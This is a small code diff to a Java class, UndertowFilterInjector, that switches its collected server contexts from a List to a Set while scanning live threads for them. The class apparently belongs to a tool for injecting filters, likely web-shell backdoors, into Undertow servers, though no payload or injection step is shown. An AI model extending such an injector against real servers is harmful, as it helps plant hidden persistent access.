@@ -30,7 +30,7 @@ public class UndertowFilterInjector {
     }
 
     public UndertowFilterInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -68,8 +68,8 @@ public class UndertowFilterInjector {
         return c + "(" + r + ")";
     }
 
-    public List<Object> getContext() {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             try {
